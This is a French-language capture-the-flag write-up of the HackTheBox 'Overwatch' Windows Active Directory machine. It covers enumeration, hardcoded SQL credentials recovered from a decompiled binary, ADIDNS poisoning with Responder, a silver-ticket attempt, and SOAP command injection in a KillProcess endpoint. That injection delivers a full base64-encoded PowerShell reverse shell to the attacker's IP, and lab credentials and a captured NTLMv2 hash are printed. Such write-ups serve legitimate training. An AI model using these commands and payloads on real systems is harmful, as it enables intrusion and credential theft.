@@ -1,0 +1,380 @@
+Pipapoup Nmap:
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 05:56 -0500
+Nmap scan report for 10.129.17.124
+Host is up (0.018s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-27 10:58:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+51484/tcp open  msrpc         Microsoft Windows RPC
+52888/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+52889/tcp open  msrpc         Microsoft Windows RPC
+53362/tcp open  msrpc         Microsoft Windows RPC
+56995/tcp open  tcpwrapped
+57002/tcp open  tcpwrapped
+Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 191.27 seconds
+
+il y a pas de site web apparement
+sudo ntpdate -bu overwatch.htb
+
+je peux me connecter en anonyme au smb
+┌──(kali㉿kali)-[~]
+└─$ smbmap -u anonymous -H overwatch.htb
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.129.17.124:445       Name: overwatch.htb             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        software$                                               READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+[*] Closed 1 connections                                                                                                     
+et je trouves des trucs dans software, bon je vais manger et après on va analyser ça
+smbget -U Anonymous 'smb://overwatch.htb/software$/Monitoring' --recursive
+je télécharge tout et je regarde
+
+dans overwatch.exe.config j'ai <add baseAddress="http://overwatch.htb:8000/MonitorService" />
+mais bon le port n'est pas ouvert (peut être intérésant plus tard)
+je trouves aussi v4.0.30319 et si je tapes overwatch + v4.0.30319 sur google je tombes sur Cherwell Overwatch Service
+
+grace a ilspy sur vscode et au .pdb j'arrive a avoir le code source.
+ça a l'air d'être un programme qui espionne l'historique du navigateur Edge sur un pc et il dans la fonction CheckEdgeHistory il me donne les parametres de connection a la db dont l'user mdp hardcodé
+SqlConnection val = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");
+
+sqlsvc:TI0LKcfHzZw1Vv
+
+le port sql est accessible donc j'essaye de me connecter avec les infos
+impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -port 6520
+ça fonctionne
+
+j'énumère vite fait ce qu'il y a
+    
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
+name        is_trustworthy_on   
+---------   -----------------   
+master                      0   
+tempdb                      0   
+model                       0   
+msdb                        1   
+overwatch                   0   
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_links
+SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
+S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
+SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
+Linked Server   Local Login   Is Self Mapping   Remote Login   
+-------------   -----------   ---------------   ------------   
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee   grantor   
+----------   --------   ---------------   ----------   -------   -------   
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_logins
+name               type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                 SQL_LOGIN                 1          1               0             0            0              0           0           0           0   
+BUILTIN\Users      WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+OVERWATCH\sqlsvc   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_users
+UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
+------------------   --------   ---------   ---------   -------------   ----------   -----   
+dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
+guest                public     NULL        NULL        guest           b'2         '   b'00'   
+INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
+sys                  public     NULL        NULL        NULL            b'4         '    NULL   
+SQL (OVERWATCH\sqlsvc  guest@master)> enum_owner
+Database    Owner              
+---------   ----------------   
+master      sa                 
+tempdb      sa                 
+model       sa                 
+msdb        sa                 
+overwatch   OVERWATCH\sqlsvc   
+
+rien dans la db overwatch
+je n'arrive pas a exploiter les links (faudra que je reteste si je trouves rien d'autre)
+je me demandes si il y a pas moyen de faire un silver ticket vu que j'ai le compte service du sql
+je me souviens d'une box où j'avais déjà fait un silver Ticket, j'y retournes pour me rafraichir la mémoire. En supeeer résumé pour accèder a la base de donnée le kdc me donne un service ticket avec les infos de qui je suis OR le ticket est chiffré avec le NTLM hash du compte service de la bdd et le hash est lui même issu du mdp QUE JE POSSEDE, je peux donc modifier les infos sur le service ticket et me faire passer pour n'importe qui.
+pour le silver ticket il me faut:
+
+1 who’s running the service?
+2 What’s the identifier of the service? (technically it’s called SPN — Service principal name)
+3 What’s the NTLM hash of the service?
+4 who do we want to impersonate?
+5 What’s the SID of the domain?
+
+1. on le sait c'est OVERWATCH\sqlsvc
+3. grace au password et a un site internet j'obtiens: ED780EA18DA655DE0828A3BBBD9ED9F0
+je lance bloodhound avec les identifiants que j'ai pour recup les autres infos
+
+┌──(kali㉿kali)-[~/Documents/overwatch]
+└─$ bloodhound-ce-python -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -d overwatch.htb -ns 10.129.18.54 -c All --zip
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: overwatch.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling bimpacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -port 6520
+ack to NTLM authentication. Error: [Errno Connection error (s200401.overwatch.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: s200401.overwatch.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 6 computers
+INFO: Connecting to LDAP server: s200401.overwatch.htb
+INFO: Found 106 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: S200401.overwatch.htb
+INFO: Done in 00M 03S
+INFO: Compressing output into 20260128073256_bloodhound.zip
+
+je rajoute S200401.overwatch.htb a /etc/hosts
+
+4. Bloodhound fait ressortir un user du lot qui semble être admin ADAM.RUSSELL@OVERWATCH.HTB RID: 1136
+5. bloodhound nous donne S-1-5-21-2797066498-1365161904-233915892
+
+ce qui bloque maintenant c'est le 2 mais on va guess
+2. MSSQLSvc/S200401.overwatch.htb ou sqlsvc/S200401.overwatch.htb ou les alternatives sans .overwatch.htb
+
+ce qui me donne la commande:
+
+impacket-ticketer \
+  -spn MSSQLSvc/S200401.overwatch.htb \
+  -nthash ED780EA18DA655DE0828A3BBBD9ED9F0 \
+  -user-id 1104 \
+  -groups 1105 \
+  -domain-sid 'S-1-5-21-2797066498-1365161904-233915892' \
+  -domain overwatch.htb \
+  sqlsvc
+
+  impacket-mssqlclient -no-pass -k 10.129.18.54
+
+après avoir capturé un ntlm grace au mssql je me rends compte que j'ai peut être pas le bon compte
+[SMB] NTLMv2-SSP Client   : 10.129.18.54
+[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
+[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:e6278107a38fad6a:7E64AEDFE1868736A871B66799E73055:010100000000000080E39B373290DC01FD4CF3AF838DBB2F0000000002000800480031004E00550001001E00570049004E002D004A004700420047005A004E00320044004B004A00560004003400570049004E002D004A004700420047005A004E00320044004B004A0056002E00480031004E0055002E004C004F00430041004C0003001400480031004E0055002E004C004F00430041004C0005001400480031004E0055002E004C004F00430041004C000700080080E39B373290DC0106000400020000000800300030000000000000000000000000300000E2038E208B55180C2CBA5746FF2F553324F5AF3E9A2E4CB5A37C403A127CDE640A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300031000000000000000000
+
+étant bloqué je vais chercher un indice et apparement il faut que je me concentre sur les links du serveur, il y en aurait qui seraient "hardcodés" ou un truc comme ça. Je ferme les indices pour me forcer a travailler un peu
+
+MSSqlPwner#S200401 (OVERWATCH\sqlsvc@master/guest)> enumerate
+State file already exists, do you want to use it? (y/n): y
+[*] Enumeration completed successfully
+[*] Saving state to file
+[*] Linkable servers:
+[*] Linked Server Name: S200401
+[*] Chain: S200401 (OVERWATCH\sqlsvc@master/guest)
+[*] Hostname: S200401
+[*] Chain ID: 358b4466-c042-4096-b61e-3f0cb30e0157
+[*] Database User: guest
+[*] Database Name: master
+[*] Server User: OVERWATCH\sqlsvc
+[*] Instance Name: SQLEXPRESS
+[*] Version: Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
+        Oct  8 2022 05:58:25 
+        Copyright (C) 2022 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
+[*] Domain Name: OVERWATCH
+[*] These databases are trustworthy: msdb
+[*] These databases are available: overwatch
+[*] --------------------------------------------------
+
+dans les propositions de mssqlpwner il me propose retrieve-password   Retrieve password from ADSI servers, faudra que je vois ce que ça veut dire https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
+
+mssqlpwner overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -windows-auth -max-link-depth 0 -port 6520 interactive
+
+SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');
+select * from openquery("SQL07", 'select * from master..sysservers')
+
+je reprends quelques semaines après, un hint sur reddit dit ADIDNS poisoning je me renseigne dessus,
+bon en gros c'est du DNS poisoning classique mais avec le DNS de l'AD, j'imagine que si j'ai les droits je peux poison le DNS pour le redirect vers mon ip et quand il request SQL07 il m'enverra un hash que j'aurais a déchiffrer (sur responder)
+J'apprends sur cette page
+https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing
+1. j'ajoute le dns record:
+dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' --record '*' --action add --data 10.10.14.87 10.129.2.78  
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+
+2. je me co sur mssql et j'utilise le serveur link:
+impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -port 6520
+use_link SQL07
+
+3. Sur responder (lancé précedemment) je retrouve le mdp EN CLAIR
+sudo responder -I tun0
+[...]
+[MSSQL] Cleartext Client   : 10.129.2.78
+[MSSQL] Cleartext Hostname : SQL07 ()
+[MSSQL] Cleartext Username : sqlmgmt
+[MSSQL] Cleartext Password : bIhBbzMMnB82yx
+
+on stocke donc ce nouvel identifiant sqlmgmt:bIhBbzMMnB82yx
+
+je vois sur bloodhound que sqlmgmt fait parti du groupe "REMOTE MANAGEMENT USERS" et que "Members of this group can access WMI resources over management protocols" donc je peux surement me connecter sur evilwinrm
+effectivement
+evil-winrm -i overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
+le user flag se trouves dans le Desktop
+
+en enumerant avec winPEAS je tombes sur ce programme 
+    overwatch(overwatch)[C:\Program Files\nssm-2.24\win64\nssm.exe] - Autoload - No quotes and Space detected
+et en recherchant si des CVE existent sur internet je tombes sur 
+CVE ID : CVE-2025-41686
+Description : A low-privileged local attacker can exploit improper permissions on nssm.exe to escalate their privileges and gain administrative access.
+mais bon je trouves AUCUNE info sur ce CVE sur internet, peut etre une mauvaise piste
+
+fausse piste je trouves toujours rien donc je lance ligolo et je fais un nmap sur le localhost
+Not shown: 65507 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+6520/tcp  open  unknown
+8000/tcp  open  http-alt
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+50478/tcp open  unknown
+50494/tcp open  unknown
+56084/tcp open  unknown
+58530/tcp open  unknown
+58531/tcp open  unknown
+58534/tcp open  unknown
+
+Je me rapelle que j'avais détecté précédement une "dans overwatch.exe.config j'ai <add baseAddress="http://overwatch.htb:8000/MonitorService" />"
+et effectivement je peux y assister
+(img: sc/monitor.jpg), j'arrive sur une page qui m'explique comment utiliser le service en interne mais j'avoue que je comprends pas trop car je maitrise pas windows:
+You have created a service.
+
+To test this service, you will need to create a client and use it to call the service. You can do this using the svcutil.exe tool from the command line with the following syntax:
+
+svcutil.exe http://overwatch.htb:8000/MonitorService?wsdl
+
+You can also access the service description as a single file:
+
+http://overwatch.htb:8000/MonitorService?singleWsdl
+
+This will generate a configuration file and a code file that contains the client class. Add the two files to your client application and use the generated client class to call the Service.
+
+En faisant des recherches sur internet je découvre ce qu'est le Wsdl et comment s'en servir, en gros c'est une API SOAP (donc utilisable avec du XML) et les endpoints sont disponible dans les fichiers XML des endpoints wsdl
+la premiere commande qui m'attire l'oeuil c'est KillProcessprocessName car il prends un process en argument et peut peut etre permettre une command injection 
+
+et c'est exactement ce que je vois dans le code source:
+    public string KillProcess(string processName)
+    {
+        string scriptContents = "Stop-Process -Name " + processName + " -Force";
+        try
+        {
+            using Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            using Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(scriptContents);
+            pipeline.Commands.Add("Out-String");
+            Collection<PSObject> collection = pipeline.Invoke();
+            runspace.Close();
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject item in collection)
+            {
+                stringBuilder.AppendLine(item.ToString());
+            }
+            return stringBuilder.ToString();
+        }
+        catch (Exception ex)
+        {
+            return "Error: " + ex.Message;
+        }
+    }
+il ne reste plus qu'a crafter la bonne commande avec un reverse shell et on pourra avoir les droits du service
+
+je fais mon reverse shell, je l'encode en base64 
+
+┌──(kali㉿kali)-[~/Documents/overwatch]
+└─$ cat reverse.ps1                                  
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.87',9333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+┌──(kali㉿kali)-[~/Documents/overwatch]
+└─$ cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOAA3ACcALAA5ADMAMwAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
+
+ensuite il me reste plus qu'a l'include dans la commande avec une requete a l'api
+pour que "Stop-Process -Name " + processName + " -Force"; se transforme en "Stop-Process -Name notepad; revshell; echo -Force";
+
+curl -s -X POST http://overwatch.htb:8000/MonitorService \
+  -H "Content-Type: text/xml; charset=utf-8" \
+  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
+  -d '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <tns:KillProcess>
+      <tns:processName>notepad; powershell -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOAA3ACcALAA5ADMAMwAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA; echo</tns:processName>
+    </tns:KillProcess>
+  </soap:Body>   
+</soap:Envelope>'
+
+nc dans une autre fenêtre 
+┌──(kali㉿kali)-[~/Documents/overwatch]
+└─$ nc -nlvp 9333
+listening on [any] 9333 ...
+connect to [10.10.14.87] from (UNKNOWN) [10.129.3.163] 54727
+whoami
+nt authority\system
+
+et c'est boonnnn !
+
+le flag se trouves dans le Desktop de l'admin.
+
+Conclusion:
+Cette machine était vraiimmment sympa, le petit coté reverse engineering rajoutais de la diversité au challenge, j'ai abandoné dans un premier temps la machine car je connaissais pas l'ADIDNS poisoning (et j'aime beaucoup cette "faille" assez élégante) mais une fois que j'ai eu l'indice le reste a filé comme de l'eau de source
